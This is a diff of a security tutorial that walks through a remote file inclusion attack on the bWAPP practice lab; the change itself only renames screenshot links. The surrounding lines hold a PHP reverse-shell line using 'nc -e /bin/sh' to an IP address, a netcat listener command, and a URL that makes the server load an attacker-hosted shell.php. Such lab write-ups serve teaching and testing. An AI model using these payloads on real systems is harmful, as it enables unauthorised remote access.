@@ -122,15 +122,15 @@ echo shell_exec("nc -e /bin/sh 192.168.1.23 1234");
 5. Start your **Netcat** listener with `nc -nlvp [YOUR IP] 1234`
 5. Now, make the server execute this file changing the URL: `/bWAPP/rlfi.php?language=http://[YOUR KALI IP]/shell.php&action=go`. As you can see we have replaced the local file `lang_en.php` for our remote file `shell.php` preceded by our server address.
 
-![RFI URL](lfi-url.png)
+![RFI URL](rfi-url.png)
 
 As you can see, we get a shell! Now you can enable **PHP** execution again with `sudo /usr/sbin/a2enmod php8.2` and restarting apache with `sudo /etc/init.d/apache2 restart` will make everything back to normality. 
 
-![RFI Shell](lfi-shell.png)
+![RFI Shell](rfi-shell.png)
 
 What happens if we don't disable **PHP**? Well, long story short, the victim server will request the file `shell.php` but it will be executed in **OUR** server so we will get a reverse shell to our own machine! 
 
-![RFI Auto Shell](lfi-auto-shell.png)
+![RFI Auto Shell](rfi-auto-shell.png)
 
 ## Other Bugs
 
